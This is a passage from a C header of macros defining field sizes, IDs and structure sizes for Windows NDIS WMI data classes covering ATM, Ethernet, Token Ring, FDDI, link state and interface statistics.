#define MSNdis_CoReceivePdusNoBuffer_NdisCoReceivePdusNoBuffer_SIZE sizeof(ULONG)
#define MSNdis_CoReceivePdusNoBuffer_NdisCoReceivePdusNoBuffer_ID 1

#define MSNdis_CoReceivePdusNoBuffer_SIZE (FIELD_OFFSET(MSNdis_CoReceivePdusNoBuffer, NdisCoReceivePdusNoBuffer) + MSNdis_CoReceivePdusNoBuffer_NdisCoReceivePdusNoBuffer_SIZE)

#define MSNdis_AtmSupportedVcRates_MinCellRate_SIZE sizeof(ULONG)
#define MSNdis_AtmSupportedVcRates_MinCellRate_ID 1
#define MSNdis_AtmSupportedVcRates_MaxCellRate_SIZE sizeof(ULONG)
#define MSNdis_AtmSupportedVcRates_MaxCellRate_ID 2

#define MSNdis_AtmSupportedVcRates_SIZE (FIELD_OFFSET(MSNdis_AtmSupportedVcRates, MaxCellRate) + MSNdis_AtmSupportedVcRates_MaxCellRate_SIZE)

#define MSNdis_AtmSupportedServiceCategory_NdisAtmSupportedServiceCategory_SIZE sizeof(ULONG)
#define MSNdis_AtmSupportedServiceCategory_NdisAtmSupportedServiceCategory_ID 1

#define MSNdis_AtmSupportedServiceCategory_SIZE (FIELD_OFFSET(MSNdis_AtmSupportedServiceCategory, NdisAtmSupportedServiceCategory) + MSNdis_AtmSupportedServiceCategory_NdisAtmSupportedServiceCategory_SIZE)

#define MSNdis_AtmSupportedAalTypes_NdisAtmSupportedAalTypes_SIZE sizeof(ULONG)
#define MSNdis_AtmSupportedAalTypes_NdisAtmSupportedAalTypes_ID 1

#define MSNdis_AtmSupportedAalTypes_SIZE (FIELD_OFFSET(MSNdis_AtmSupportedAalTypes, NdisAtmSupportedAalTypes) + MSNdis_AtmSupportedAalTypes_NdisAtmSupportedAalTypes_SIZE)

#define MSNdis_AtmHardwareCurrentAddress_NdisAtmHardwareCurrentAddress_SIZE sizeof(MSNdis_NetworkAddress)
#define MSNdis_AtmHardwareCurrentAddress_NdisAtmHardwareCurrentAddress_ID 1

#define MSNdis_AtmHardwareCurrentAddress_SIZE (FIELD_OFFSET(MSNdis_AtmHardwareCurrentAddress, NdisAtmHardwareCurrentAddress) + MSNdis_AtmHardwareCurrentAddress_NdisAtmHardwareCurrentAddress_SIZE)

#define MSNdis_AtmMaxActiveVcs_NdisAtmMaxActiveVcs_SIZE sizeof(ULONG)
#define MSNdis_AtmMaxActiveVcs_NdisAtmMaxActiveVcs_ID 1

#define MSNdis_AtmMaxActiveVcs_SIZE (FIELD_OFFSET(MSNdis_AtmMaxActiveVcs, NdisAtmMaxActiveVcs) + MSNdis_AtmMaxActiveVcs_NdisAtmMaxActiveVcs_SIZE)

#define MSNdis_AtmMaxActiveVciBits_NdisAtmMaxActiveVciBits_SIZE sizeof(ULONG)
#define MSNdis_AtmMaxActiveVciBits_NdisAtmMaxActiveVciBits_ID 1

#define MSNdis_AtmMaxActiveVciBits_SIZE (FIELD_OFFSET(MSNdis_AtmMaxActiveVciBits, NdisAtmMaxActiveVciBits) + MSNdis_AtmMaxActiveVciBits_NdisAtmMaxActiveVciBits_SIZE)

#define MSNdis_AtmMaxActiveVpiBits_NdisAtmMaxActiveVpiBits_SIZE sizeof(ULONG)
#define MSNdis_AtmMaxActiveVpiBits_NdisAtmMaxActiveVpiBits_ID 1

#define MSNdis_AtmMaxActiveVpiBits_SIZE (FIELD_OFFSET(MSNdis_AtmMaxActiveVpiBits, NdisAtmMaxActiveVpiBits) + MSNdis_AtmMaxActiveVpiBits_NdisAtmMaxActiveVpiBits_SIZE)

#define MSNdis_AtmMaxAal0PacketSize_NdisAtmMaxAal0PacketSize_SIZE sizeof(ULONG)
#define MSNdis_AtmMaxAal0PacketSize_NdisAtmMaxAal0PacketSize_ID 1

#define MSNdis_AtmMaxAal0PacketSize_SIZE (FIELD_OFFSET(MSNdis_AtmMaxAal0PacketSize, NdisAtmMaxAal0PacketSize) + MSNdis_AtmMaxAal0PacketSize_NdisAtmMaxAal0PacketSize_SIZE)

#define MSNdis_AtmMaxAal1PacketSize_NdisAtmMaxAal1PacketSize_SIZE sizeof(ULONG)
#define MSNdis_AtmMaxAal1PacketSize_NdisAtmMaxAal1PacketSize_ID 1

#define MSNdis_AtmMaxAal1PacketSize_SIZE (FIELD_OFFSET(MSNdis_AtmMaxAal1PacketSize, NdisAtmMaxAal1PacketSize) + MSNdis_AtmMaxAal1PacketSize_NdisAtmMaxAal1PacketSize_SIZE)

#define MSNdis_AtmMaxAal34PacketSize_NdisAtmMaxAal34PacketSize_SIZE sizeof(ULONG)
#define MSNdis_AtmMaxAal34PacketSize_NdisAtmMaxAal34PacketSize_ID 1

#define MSNdis_AtmMaxAal34PacketSize_SIZE (FIELD_OFFSET(MSNdis_AtmMaxAal34PacketSize, NdisAtmMaxAal34PacketSize) + MSNdis_AtmMaxAal34PacketSize_NdisAtmMaxAal34PacketSize_SIZE)

#define MSNdis_AtmMaxAal5PacketSize_NdisAtmMaxAal5PacketSize_SIZE sizeof(ULONG)
#define MSNdis_AtmMaxAal5PacketSize_NdisAtmMaxAal5PacketSize_ID 1

#define MSNdis_AtmMaxAal5PacketSize_SIZE (FIELD_OFFSET(MSNdis_AtmMaxAal5PacketSize, NdisAtmMaxAal5PacketSize) + MSNdis_AtmMaxAal5PacketSize_NdisAtmMaxAal5PacketSize_SIZE)

#define MSNdis_AtmReceiveCellsOk_NdisAtmReceiveCellsOk_SIZE sizeof(ULONGLONG)
#define MSNdis_AtmReceiveCellsOk_NdisAtmReceiveCellsOk_ID 1

#define MSNdis_AtmReceiveCellsOk_SIZE (FIELD_OFFSET(MSNdis_AtmReceiveCellsOk, NdisAtmReceiveCellsOk) + MSNdis_AtmReceiveCellsOk_NdisAtmReceiveCellsOk_SIZE)

#define MSNdis_AtmTransmitCellsOk_NdisAtmTransmitCellsOk_SIZE sizeof(ULONGLONG)
#define MSNdis_AtmTransmitCellsOk_NdisAtmTransmitCellsOk_ID 1

#define MSNdis_AtmTransmitCellsOk_SIZE (FIELD_OFFSET(MSNdis_AtmTransmitCellsOk, NdisAtmTransmitCellsOk) + MSNdis_AtmTransmitCellsOk_NdisAtmTransmitCellsOk_SIZE)

#define MSNdis_AtmReceiveCellsDropped_NdisAtmReceiveCellsDropped_SIZE sizeof(ULONGLONG)
#define MSNdis_AtmReceiveCellsDropped_NdisAtmReceiveCellsDropped_ID 1

#define MSNdis_AtmReceiveCellsDropped_SIZE (FIELD_OFFSET(MSNdis_AtmReceiveCellsDropped, NdisAtmReceiveCellsDropped) + MSNdis_AtmReceiveCellsDropped_NdisAtmReceiveCellsDropped_SIZE)

#define MSNdis_EthernetPermanentAddress_NdisPermanentAddress_SIZE sizeof(MSNdis_NetworkAddress)
#define MSNdis_EthernetPermanentAddress_NdisPermanentAddress_ID 1

#define MSNdis_EthernetPermanentAddress_SIZE (FIELD_OFFSET(MSNdis_EthernetPermanentAddress, NdisPermanentAddress) + MSNdis_EthernetPermanentAddress_NdisPermanentAddress_SIZE)

#define MSNdis_EthernetCurrentAddress_NdisCurrentAddress_SIZE sizeof(MSNdis_NetworkAddress)
#define MSNdis_EthernetCurrentAddress_NdisCurrentAddress_ID 1

#define MSNdis_EthernetCurrentAddress_SIZE (FIELD_OFFSET(MSNdis_EthernetCurrentAddress, NdisCurrentAddress) + MSNdis_EthernetCurrentAddress_NdisCurrentAddress_SIZE)

#define MSNdis_EthernetMulticastList_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_EthernetMulticastList_NumberElements_ID 1
#define MSNdis_EthernetMulticastList_NdisMulticastList_ID 2

#define MSNdis_EthernetMaximumMulticastListSize_NdisEthernetMaximumMulticastListSize_SIZE sizeof(ULONG)
#define MSNdis_EthernetMaximumMulticastListSize_NdisEthernetMaximumMulticastListSize_ID 1

#define MSNdis_EthernetMaximumMulticastListSize_SIZE (FIELD_OFFSET(MSNdis_EthernetMaximumMulticastListSize, NdisEthernetMaximumMulticastListSize) + MSNdis_EthernetMaximumMulticastListSize_NdisEthernetMaximumMulticastListSize_SIZE)

#define MSNdis_EthernetMacOptions_NdisEthernetMacOptions_SIZE sizeof(ULONG)
#define MSNdis_EthernetMacOptions_NdisEthernetMacOptions_ID 1

#define MSNdis_EthernetMacOptions_SIZE (FIELD_OFFSET(MSNdis_EthernetMacOptions, NdisEthernetMacOptions) + MSNdis_EthernetMacOptions_NdisEthernetMacOptions_SIZE)

#define MSNdis_EthernetReceiveErrorAlignment_NdisEthernetReceiveErrorAlignment_SIZE sizeof(ULONG)
#define MSNdis_EthernetReceiveErrorAlignment_NdisEthernetReceiveErrorAlignment_ID 1

#define MSNdis_EthernetReceiveErrorAlignment_SIZE (FIELD_OFFSET(MSNdis_EthernetReceiveErrorAlignment, NdisEthernetReceiveErrorAlignment) + MSNdis_EthernetReceiveErrorAlignment_NdisEthernetReceiveErrorAlignment_SIZE)

#define MSNdis_EthernetOneTransmitCollision_NdisEthernetOneTransmitCollision_SIZE sizeof(ULONG)
#define MSNdis_EthernetOneTransmitCollision_NdisEthernetOneTransmitCollision_ID 1

#define MSNdis_EthernetOneTransmitCollision_SIZE (FIELD_OFFSET(MSNdis_EthernetOneTransmitCollision, NdisEthernetOneTransmitCollision) + MSNdis_EthernetOneTransmitCollision_NdisEthernetOneTransmitCollision_SIZE)

#define MSNdis_EthernetMoreTransmitCollisions_NdisEthernetMoreTransmitCollisions_SIZE sizeof(ULONG)
#define MSNdis_EthernetMoreTransmitCollisions_NdisEthernetMoreTransmitCollisions_ID 1

#define MSNdis_EthernetMoreTransmitCollisions_SIZE (FIELD_OFFSET(MSNdis_EthernetMoreTransmitCollisions, NdisEthernetMoreTransmitCollisions) + MSNdis_EthernetMoreTransmitCollisions_NdisEthernetMoreTransmitCollisions_SIZE)

#define MSNdis_TokenRingPermanentAddress_NdisPermanentAddress_SIZE sizeof(MSNdis_NetworkAddress)
#define MSNdis_TokenRingPermanentAddress_NdisPermanentAddress_ID 1

#define MSNdis_TokenRingPermanentAddress_SIZE (FIELD_OFFSET(MSNdis_TokenRingPermanentAddress, NdisPermanentAddress) + MSNdis_TokenRingPermanentAddress_NdisPermanentAddress_SIZE)

#define MSNdis_TokenRingCurrentAddress_NdisCurrentAddress_SIZE sizeof(MSNdis_NetworkAddress)
#define MSNdis_TokenRingCurrentAddress_NdisCurrentAddress_ID 1

#define MSNdis_TokenRingCurrentAddress_SIZE (FIELD_OFFSET(MSNdis_TokenRingCurrentAddress, NdisCurrentAddress) + MSNdis_TokenRingCurrentAddress_NdisCurrentAddress_SIZE)

#define MSNdis_TokenRingCurrentFunctional_NdisTokenRingCurrentFunctional_SIZE sizeof(ULONG)
#define MSNdis_TokenRingCurrentFunctional_NdisTokenRingCurrentFunctional_ID 1

#define MSNdis_TokenRingCurrentFunctional_SIZE (FIELD_OFFSET(MSNdis_TokenRingCurrentFunctional, NdisTokenRingCurrentFunctional) + MSNdis_TokenRingCurrentFunctional_NdisTokenRingCurrentFunctional_SIZE)

#define MSNdis_TokenRingCurrentGroup_NdisTokenRingCurrentGroup_SIZE sizeof(ULONG)
#define MSNdis_TokenRingCurrentGroup_NdisTokenRingCurrentGroup_ID 1

#define MSNdis_TokenRingCurrentGroup_SIZE (FIELD_OFFSET(MSNdis_TokenRingCurrentGroup, NdisTokenRingCurrentGroup) + MSNdis_TokenRingCurrentGroup_NdisTokenRingCurrentGroup_SIZE)

#define MSNdis_TokenRingLastOpenStatus_NdisTokenRingLastOpenStatus_SIZE sizeof(ULONG)
#define MSNdis_TokenRingLastOpenStatus_NdisTokenRingLastOpenStatus_ID 1

#define MSNdis_TokenRingLastOpenStatus_SIZE (FIELD_OFFSET(MSNdis_TokenRingLastOpenStatus, NdisTokenRingLastOpenStatus) + MSNdis_TokenRingLastOpenStatus_NdisTokenRingLastOpenStatus_SIZE)

#define MSNdis_TokenRingCurrentRingStatus_NdisTokenRingCurrentRingStatus_SIZE sizeof(ULONG)
#define MSNdis_TokenRingCurrentRingStatus_NdisTokenRingCurrentRingStatus_ID 1

#define MSNdis_TokenRingCurrentRingStatus_SIZE (FIELD_OFFSET(MSNdis_TokenRingCurrentRingStatus, NdisTokenRingCurrentRingStatus) + MSNdis_TokenRingCurrentRingStatus_NdisTokenRingCurrentRingStatus_SIZE)

#define MSNdis_TokenRingCurrentRingState_NdisTokenRingCurrentRingState_SIZE sizeof(ULONG)
#define MSNdis_TokenRingCurrentRingState_NdisTokenRingCurrentRingState_ID 1

#define MSNdis_TokenRingCurrentRingState_SIZE (FIELD_OFFSET(MSNdis_TokenRingCurrentRingState, NdisTokenRingCurrentRingState) + MSNdis_TokenRingCurrentRingState_NdisTokenRingCurrentRingState_SIZE)

#define MSNdis_TokenRingLineErrors_NdisTokenRingLineErrors_SIZE sizeof(ULONG)
#define MSNdis_TokenRingLineErrors_NdisTokenRingLineErrors_ID 1

#define MSNdis_TokenRingLineErrors_SIZE (FIELD_OFFSET(MSNdis_TokenRingLineErrors, NdisTokenRingLineErrors) + MSNdis_TokenRingLineErrors_NdisTokenRingLineErrors_SIZE)

#define MSNdis_TokenRingLostFrames_NdisTokenRingLostFrames_SIZE sizeof(ULONG)
#define MSNdis_TokenRingLostFrames_NdisTokenRingLostFrames_ID 1

#define MSNdis_TokenRingLostFrames_SIZE (FIELD_OFFSET(MSNdis_TokenRingLostFrames, NdisTokenRingLostFrames) + MSNdis_TokenRingLostFrames_NdisTokenRingLostFrames_SIZE)

#define MSNdis_FddiLongPermanentAddress_NdisPermanentAddress_SIZE sizeof(MSNdis_NetworkAddress)
#define MSNdis_FddiLongPermanentAddress_NdisPermanentAddress_ID 1

#define MSNdis_FddiLongPermanentAddress_SIZE (FIELD_OFFSET(MSNdis_FddiLongPermanentAddress, NdisPermanentAddress) + MSNdis_FddiLongPermanentAddress_NdisPermanentAddress_SIZE)

#define MSNdis_FddiLongCurrentAddress_NdisCurrentAddress_SIZE sizeof(MSNdis_NetworkAddress)
#define MSNdis_FddiLongCurrentAddress_NdisCurrentAddress_ID 1

#define MSNdis_FddiLongCurrentAddress_SIZE (FIELD_OFFSET(MSNdis_FddiLongCurrentAddress, NdisCurrentAddress) + MSNdis_FddiLongCurrentAddress_NdisCurrentAddress_SIZE)

#define MSNdis_FddiLongMulticastList_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_FddiLongMulticastList_NumberElements_ID 1
#define MSNdis_FddiLongMulticastList_NdisMulticastList_ID 2

#define MSNdis_FddiLongMaximumListSize_NdisFddiLongMaximumListSize_SIZE sizeof(ULONG)
#define MSNdis_FddiLongMaximumListSize_NdisFddiLongMaximumListSize_ID 1

#define MSNdis_FddiLongMaximumListSize_SIZE (FIELD_OFFSET(MSNdis_FddiLongMaximumListSize, NdisFddiLongMaximumListSize) + MSNdis_FddiLongMaximumListSize_NdisFddiLongMaximumListSize_SIZE)

#define MSNdis_FddiShortPermanentAddress_NdisPermanentAddress_SIZE sizeof(MSNdis_NetworkShortAddress)
#define MSNdis_FddiShortPermanentAddress_NdisPermanentAddress_ID 1

#define MSNdis_FddiShortPermanentAddress_SIZE (FIELD_OFFSET(MSNdis_FddiShortPermanentAddress, NdisPermanentAddress) + MSNdis_FddiShortPermanentAddress_NdisPermanentAddress_SIZE)

#define MSNdis_FddiShortCurrentAddress_NdisCurrentAddress_SIZE sizeof(MSNdis_NetworkShortAddress)
#define MSNdis_FddiShortCurrentAddress_NdisCurrentAddress_ID 1

#define MSNdis_FddiShortCurrentAddress_SIZE (FIELD_OFFSET(MSNdis_FddiShortCurrentAddress, NdisCurrentAddress) + MSNdis_FddiShortCurrentAddress_NdisCurrentAddress_SIZE)

#define MSNdis_FddiShortMulticastList_NumberElements_SIZE sizeof(ULONG)
#define MSNdis_FddiShortMulticastList_NumberElements_ID 1
#define MSNdis_FddiShortMulticastList_NdisMulticastList_ID 2

#define MSNdis_FddiShortMaximumListSize_NdisFddiShortMaximumListSize_SIZE sizeof(ULONG)
#define MSNdis_FddiShortMaximumListSize_NdisFddiShortMaximumListSize_ID 1

#define MSNdis_FddiShortMaximumListSize_SIZE (FIELD_OFFSET(MSNdis_FddiShortMaximumListSize, NdisFddiShortMaximumListSize) + MSNdis_FddiShortMaximumListSize_NdisFddiShortMaximumListSize_SIZE)

#define MSNdis_FddiAttachmentType_NdisFddiAttachmentType_SIZE sizeof(ULONG)
#define MSNdis_FddiAttachmentType_NdisFddiAttachmentType_ID 1

#define MSNdis_FddiAttachmentType_SIZE (FIELD_OFFSET(MSNdis_FddiAttachmentType, NdisFddiAttachmentType) + MSNdis_FddiAttachmentType_NdisFddiAttachmentType_SIZE)

#define MSNdis_FddiUpstreamNodeLong_NdisFddiUpstreamNodeLong_SIZE sizeof(MSNdis_NetworkAddress)
#define MSNdis_FddiUpstreamNodeLong_NdisFddiUpstreamNodeLong_ID 1

#define MSNdis_FddiUpstreamNodeLong_SIZE (FIELD_OFFSET(MSNdis_FddiUpstreamNodeLong, NdisFddiUpstreamNodeLong) + MSNdis_FddiUpstreamNodeLong_NdisFddiUpstreamNodeLong_SIZE)

#define MSNdis_FddiDownstreamNodeLong_NdisFddiDownstreamNodeLong_SIZE sizeof(MSNdis_NetworkAddress)
#define MSNdis_FddiDownstreamNodeLong_NdisFddiDownstreamNodeLong_ID 1

#define MSNdis_FddiDownstreamNodeLong_SIZE (FIELD_OFFSET(MSNdis_FddiDownstreamNodeLong, NdisFddiDownstreamNodeLong) + MSNdis_FddiDownstreamNodeLong_NdisFddiDownstreamNodeLong_SIZE)

#define MSNdis_FddiFrameErrors_NdisFddiFrameErrors_SIZE sizeof(ULONG)
#define MSNdis_FddiFrameErrors_NdisFddiFrameErrors_ID 1

#define MSNdis_FddiFrameErrors_SIZE (FIELD_OFFSET(MSNdis_FddiFrameErrors, NdisFddiFrameErrors) + MSNdis_FddiFrameErrors_NdisFddiFrameErrors_SIZE)

#define MSNdis_FddiFramesLost_NdisFddiFramesLost_SIZE sizeof(ULONG)
#define MSNdis_FddiFramesLost_NdisFddiFramesLost_ID 1

#define MSNdis_FddiFramesLost_SIZE (FIELD_OFFSET(MSNdis_FddiFramesLost, NdisFddiFramesLost) + MSNdis_FddiFramesLost_NdisFddiFramesLost_SIZE)

#define MSNdis_FddiRingManagmentState_NdisFddiRingManagmentState_SIZE sizeof(ULONG)
#define MSNdis_FddiRingManagmentState_NdisFddiRingManagmentState_ID 1

#define MSNdis_FddiRingManagmentState_SIZE (FIELD_OFFSET(MSNdis_FddiRingManagmentState, NdisFddiRingManagmentState) + MSNdis_FddiRingManagmentState_NdisFddiRingManagmentState_SIZE)

#define MSNdis_FddiLctFailures_NdisFddiLctFailures_SIZE sizeof(ULONG)
#define MSNdis_FddiLctFailures_NdisFddiLctFailures_ID 1

#define MSNdis_FddiLctFailures_SIZE (FIELD_OFFSET(MSNdis_FddiLctFailures, NdisFddiLctFailures) + MSNdis_FddiLctFailures_NdisFddiLctFailures_SIZE)

#define MSNdis_FddiLemRejects_NdisFddiLemRejects_SIZE sizeof(ULONG)
#define MSNdis_FddiLemRejects_NdisFddiLemRejects_ID 1

#define MSNdis_FddiLemRejects_SIZE (FIELD_OFFSET(MSNdis_FddiLemRejects, NdisFddiLemRejects) + MSNdis_FddiLemRejects_NdisFddiLemRejects_SIZE)

#define MSNdis_FddiLConnectionState_NdisFddiLConnectionState_SIZE sizeof(ULONG)
#define MSNdis_FddiLConnectionState_NdisFddiLConnectionState_ID 1

#define MSNdis_FddiLConnectionState_SIZE (FIELD_OFFSET(MSNdis_FddiLConnectionState, NdisFddiLConnectionState) + MSNdis_FddiLConnectionState_NdisFddiLConnectionState_SIZE)

#define MSNdis_ObjectHeader_Type_SIZE sizeof(UCHAR)
#define MSNdis_ObjectHeader_Type_ID 1
#define MSNdis_ObjectHeader_Revision_SIZE sizeof(UCHAR)
#define MSNdis_ObjectHeader_Revision_ID 2
#define MSNdis_ObjectHeader_Size_SIZE sizeof(USHORT)
#define MSNdis_ObjectHeader_Size_ID 3

#define MSNdis_ObjectHeader_SIZE (FIELD_OFFSET(MSNdis_ObjectHeader, Size) + MSNdis_ObjectHeader_Size_SIZE)

#define MSNdis_WmiMethodHeader_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_WmiMethodHeader_Header_ID 1
#define MSNdis_WmiMethodHeader_PortNumber_SIZE sizeof(ULONG)
#define MSNdis_WmiMethodHeader_PortNumber_ID 2
#define MSNdis_WmiMethodHeader_NetLuid_SIZE sizeof(ULONGLONG)
#define MSNdis_WmiMethodHeader_NetLuid_ID 3
#define MSNdis_WmiMethodHeader_RequestId_SIZE sizeof(ULONGLONG)
#define MSNdis_WmiMethodHeader_RequestId_ID 4
#define MSNdis_WmiMethodHeader_Timeout_SIZE sizeof(ULONG)
#define MSNdis_WmiMethodHeader_Timeout_ID 5
#define MSNdis_WmiMethodHeader_Padding_SIZE sizeof(ULONG)
#define MSNdis_WmiMethodHeader_Padding_ID 6

#define MSNdis_WmiMethodHeader_SIZE (FIELD_OFFSET(MSNdis_WmiMethodHeader, Padding) + MSNdis_WmiMethodHeader_Padding_SIZE)

#define MSNdis_WmiSetHeader_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_WmiSetHeader_Header_ID 1
#define MSNdis_WmiSetHeader_PortNumber_SIZE sizeof(ULONG)
#define MSNdis_WmiSetHeader_PortNumber_ID 2
#define MSNdis_WmiSetHeader_NetLuid_SIZE sizeof(ULONGLONG)
#define MSNdis_WmiSetHeader_NetLuid_ID 3
#define MSNdis_WmiSetHeader_RequestId_SIZE sizeof(ULONGLONG)
#define MSNdis_WmiSetHeader_RequestId_ID 4
#define MSNdis_WmiSetHeader_Timeout_SIZE sizeof(ULONG)
#define MSNdis_WmiSetHeader_Timeout_ID 5
#define MSNdis_WmiSetHeader_Padding_SIZE sizeof(ULONG)
#define MSNdis_WmiSetHeader_Padding_ID 6

#define MSNdis_WmiSetHeader_SIZE (FIELD_OFFSET(MSNdis_WmiSetHeader, Padding) + MSNdis_WmiSetHeader_Padding_SIZE)

#define MSNdis_WmiOutputInfo_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_WmiOutputInfo_Header_ID 1
#define MSNdis_WmiOutputInfo_Flags_SIZE sizeof(ULONG)
#define MSNdis_WmiOutputInfo_Flags_ID 2
#define MSNdis_WmiOutputInfo_SupportedRevision_SIZE sizeof(UCHAR)
#define MSNdis_WmiOutputInfo_SupportedRevision_ID 3
#define MSNdis_WmiOutputInfo_Padding1_SIZE sizeof(UCHAR)
#define MSNdis_WmiOutputInfo_Padding1_ID 4
#define MSNdis_WmiOutputInfo_Padding2_SIZE sizeof(USHORT)
#define MSNdis_WmiOutputInfo_Padding2_ID 5
#define MSNdis_WmiOutputInfo_DataOffset_SIZE sizeof(ULONG)
#define MSNdis_WmiOutputInfo_DataOffset_ID 6

#define MSNdis_WmiOutputInfo_SIZE (FIELD_OFFSET(MSNdis_WmiOutputInfo, DataOffset) + MSNdis_WmiOutputInfo_DataOffset_SIZE)

#define MSNdis_WmiEnumAdapter_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_WmiEnumAdapter_Header_ID 1
#define MSNdis_WmiEnumAdapter_IfIndex_SIZE sizeof(ULONG)
#define MSNdis_WmiEnumAdapter_IfIndex_ID 2
#define MSNdis_WmiEnumAdapter_NetLuid_SIZE sizeof(ULONGLONG)
#define MSNdis_WmiEnumAdapter_NetLuid_ID 3
#define MSNdis_WmiEnumAdapter_DeviceName_ID 4

#define MSNdis_LinkStateData_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_LinkStateData_Header_ID 1
#define MSNdis_LinkStateData_MediaConnectState_SIZE sizeof(ULONG)
#define MSNdis_LinkStateData_MediaConnectState_ID 2
#define MSNdis_LinkStateData_MediaDuplexState_SIZE sizeof(ULONG)
#define MSNdis_LinkStateData_MediaDuplexState_ID 3
#define MSNdis_LinkStateData_XmitLinkSpeed_SIZE sizeof(ULONGLONG)
#define MSNdis_LinkStateData_XmitLinkSpeed_ID 4
#define MSNdis_LinkStateData_RcvLinkSpeed_SIZE sizeof(ULONGLONG)
#define MSNdis_LinkStateData_RcvLinkSpeed_ID 5
#define MSNdis_LinkStateData_PauseFunctions_SIZE sizeof(ULONG)
#define MSNdis_LinkStateData_PauseFunctions_ID 6
#define MSNdis_LinkStateData_AutoNegotiationFlags_SIZE sizeof(ULONG)
#define MSNdis_LinkStateData_AutoNegotiationFlags_ID 7

#define MSNdis_LinkStateData_SIZE (FIELD_OFFSET(MSNdis_LinkStateData, AutoNegotiationFlags) + MSNdis_LinkStateData_AutoNegotiationFlags_SIZE)

#define MSNdis_LinkParameters_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_LinkParameters_Header_ID 1
#define MSNdis_LinkParameters_MediaDuplexState_SIZE sizeof(ULONG)
#define MSNdis_LinkParameters_MediaDuplexState_ID 2
#define MSNdis_LinkParameters_XmitLinkSpeed_SIZE sizeof(ULONGLONG)
#define MSNdis_LinkParameters_XmitLinkSpeed_ID 3
#define MSNdis_LinkParameters_RcvLinkSpeed_SIZE sizeof(ULONGLONG)
#define MSNdis_LinkParameters_RcvLinkSpeed_ID 4
#define MSNdis_LinkParameters_PauseFunctions_SIZE sizeof(ULONG)
#define MSNdis_LinkParameters_PauseFunctions_ID 5
#define MSNdis_LinkParameters_AutoNegotiationFlags_SIZE sizeof(ULONG)
#define MSNdis_LinkParameters_AutoNegotiationFlags_ID 6

#define MSNdis_LinkParameters_SIZE (FIELD_OFFSET(MSNdis_LinkParameters, AutoNegotiationFlags) + MSNdis_LinkParameters_AutoNegotiationFlags_SIZE)

#define MSNdis_InterruptModerationParameters_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_InterruptModerationParameters_Header_ID 1
#define MSNdis_InterruptModerationParameters_Flags_SIZE sizeof(ULONG)
#define MSNdis_InterruptModerationParameters_Flags_ID 2
#define MSNdis_InterruptModerationParameters_InterruptModeration_SIZE sizeof(ULONG)
#define MSNdis_InterruptModerationParameters_InterruptModeration_ID 3

#define MSNdis_InterruptModerationParameters_SIZE (FIELD_OFFSET(MSNdis_InterruptModerationParameters, InterruptModeration) + MSNdis_InterruptModerationParameters_InterruptModeration_SIZE)

#define MSNdis_StatisticsInfo_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_StatisticsInfo_Header_ID 1
#define MSNdis_StatisticsInfo_SupportedStatistics_SIZE sizeof(ULONG)
#define MSNdis_StatisticsInfo_SupportedStatistics_ID 2
#define MSNdis_StatisticsInfo_ifInDiscards_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifInDiscards_ID 3
#define MSNdis_StatisticsInfo_ifInErrors_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifInErrors_ID 4
#define MSNdis_StatisticsInfo_ifHCInOctets_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifHCInOctets_ID 5
#define MSNdis_StatisticsInfo_ifHCInUcastPkts_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifHCInUcastPkts_ID 6
#define MSNdis_StatisticsInfo_ifHCInMulticastPkts_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifHCInMulticastPkts_ID 7
#define MSNdis_StatisticsInfo_ifHCInBroadcastPkts_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifHCInBroadcastPkts_ID 8
#define MSNdis_StatisticsInfo_ifHCOutOctets_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifHCOutOctets_ID 9
#define MSNdis_StatisticsInfo_ifHCOutUcastPkts_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifHCOutUcastPkts_ID 10
#define MSNdis_StatisticsInfo_ifHCOutMulticastPkts_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifHCOutMulticastPkts_ID 11
#define MSNdis_StatisticsInfo_ifHCOutBroadcastPkts_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifHCOutBroadcastPkts_ID 12
#define MSNdis_StatisticsInfo_ifOutErrors_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifOutErrors_ID 13
#define MSNdis_StatisticsInfo_ifOutDiscards_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifOutDiscards_ID 14
#define MSNdis_StatisticsInfo_ifHCInUcastOctets_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifHCInUcastOctets_ID 15
#define MSNdis_StatisticsInfo_ifHCInMulticastOctets_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifHCInMulticastOctets_ID 16
#define MSNdis_StatisticsInfo_ifHCInBroadcastOctets_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifHCInBroadcastOctets_ID 17
#define MSNdis_StatisticsInfo_ifHCOutUcastOctets_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifHCOutUcastOctets_ID 18
#define MSNdis_StatisticsInfo_ifHCOutMulticastOctets_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifHCOutMulticastOctets_ID 19
#define MSNdis_StatisticsInfo_ifHCOutBroadcastOctets_SIZE sizeof(ULONGLONG)
#define MSNdis_StatisticsInfo_ifHCOutBroadcastOctets_ID 20

#define MSNdis_StatisticsInfo_SIZE (FIELD_OFFSET(MSNdis_StatisticsInfo, ifHCOutBroadcastOctets) + MSNdis_StatisticsInfo_ifHCOutBroadcastOctets_SIZE)

#define MSNdis_PortStateData_Header_SIZE sizeof(MSNdis_ObjectHeader)
#define MSNdis_PortStateData_Header_ID 1
